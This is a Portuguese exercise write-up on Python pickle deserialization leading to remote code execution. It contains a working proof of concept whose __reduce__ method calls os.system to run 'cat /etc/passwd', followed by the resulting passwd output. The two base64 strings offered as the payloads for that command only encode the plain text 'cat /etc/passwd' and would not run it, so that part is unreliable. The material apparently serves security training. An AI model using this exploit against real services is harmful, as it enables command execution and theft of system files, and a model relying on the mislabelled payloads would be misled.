## Módulo 02 / Exercício 00 - Deserialization with RCE - Payloads

Os atacantes podem simular injetando diversos valores. Nesse exercício, os dados enviados precisam ser serializados com o Pickle e depois gerado um hash de base64. Porém, a vulnerabilidade ocorre porque não há um tratamento que valide que os dados de entradas são confiáveis.

Para o comando **cat /etc/passwd**, geramos os seguintes hashes:

Python Versão < 3:

    UydjYXQgL2V0Yy9wYXNzd2QnCnAwCi4=

Python Versão >= 3:

    gASVEwAAAAAAAACMD2NhdCAvZXRjL3Bhc3N3ZJQu
  

Aqui é possível verificar um trecho de código que apresenta a a vulnerabilidade no próprio pickle:

    import pickle
    import os
    import sys

    class RCE:
        def __reduce__(self):
            return (os.system, ('cat /etc/passwd',))

    # Serializando o objeto malicioso
    malicious_pickle = pickle.dumps(RCE())

    # Desserializando o objeto malicioso
    pickle.loads(malicious_pickle)


Verificará que a mesmo não tendo qualquer retorno no médoto, o pickle.loads acabará executando o comando **cat /etc/passwd**.

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    ...
    speech-dispatcher:x:131:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
    zabbix:x:132:140::/nonexistent:/usr/sbin/nologin